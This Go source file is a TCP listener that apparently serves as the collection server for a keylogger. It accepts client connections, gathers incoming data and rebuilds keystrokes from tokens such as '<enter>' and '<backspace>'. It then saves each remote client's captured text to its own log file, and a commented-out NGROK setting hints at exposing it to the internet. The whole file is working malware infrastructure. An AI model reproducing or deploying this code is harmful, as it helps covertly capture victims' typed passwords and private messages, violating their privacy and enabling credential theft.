package main

import (
	"fmt"
	"net"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	colour "github.com/fatih/color"
)

// configuration
const (
	HOST, PORT = "127.0.0.1", "2941"
	BUFFER     = 4096
	TYPE       = "tcp"
	//NGROK      = false
)

var (
	// outfile
	logFile = time.Now().Format("2006-01-02-15:04:05.log")

	// colours
	errPr = colour.New(colour.FgHiRed)
	sucPr = colour.New(colour.FgGreen)
	warPr = colour.New(colour.FgYellow)

	// for stopping all threads
	server   net.Listener
	maintain = true
)

// tracks the provided connection and tunnels received data into the appropriate logfile.
func track(conn net.Conn) {
	sucPr.Printf("[C] New client: %s.\n", conn.RemoteAddr().String())
	log := "" // dump
	connected := true
	go func() {
		for maintain {
			data := make([]byte, BUFFER)
			if rl, err := conn.Read(data); err != nil {
				warPr.Printf("[D] Closing connection with %s: %s\n", conn.RemoteAddr().String(), err.Error())
				break
			} else {
				// add to log
				log += string(data[:rl])
			}
			conn.Write([]byte("Received :)"))
		}
		connected = false
	}()
	for maintain && connected {
		time.Sleep(time.Second)
	}
	conn.Close()
	// write to logfile
	if len(log) > 0 {
		// parse
		log = strings.ReplaceAll(log, "<tab>", "\t")
		log = strings.ReplaceAll(log, "<enter>", "\n")
		for {
			i := strings.Index(log, "<backspace>")
			if i == 0 {
				log = log[11:]
			} else if i > 0 {
				log = log[:i-1] + log[i+11:]
			} else {
				break
			}
		}
		sucPr.Printf("Parsed data from %s (enters, backspaces, etc).\n", conn.RemoteAddr().String())
		err := os.WriteFile(fmt.Sprintf("%s-%s", conn.RemoteAddr().String(), logFile), []byte(log), 0644)
		if err != nil {
			errPr.Printf("Failed to write data from %s: %s\n", conn.RemoteAddr().String(), err.Error())
		} else {
			sucPr.Printf("Successfully wrote data from %s\n", conn.RemoteAddr().String())
		}
	}
}

func main() {
	// initiate the server
	var err error
	server, err = net.Listen(TYPE, HOST+":"+PORT)
	if err != nil {
		errPr.Println("Failed to listen: ", err.Error())
		os.Exit(1)
	} else {
		defer server.Close()
	}

	// wait for clients
	sucPr.Printf("! Listening on %s:%s.\n", HOST, PORT)
	for {
		if conn, err := server.Accept(); err != nil {
			warPr.Printf("Error accepting client: %s\n", err.Error())
		} else {
			go track(conn)
		}
	}
}

func init() {
	// on close, stop maintaining
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		warPr.Println("Closing all connections...")
		maintain = false
		time.Sleep(time.Second * 5) // give time for threads to dump
		os.Exit(0)
	}()
}
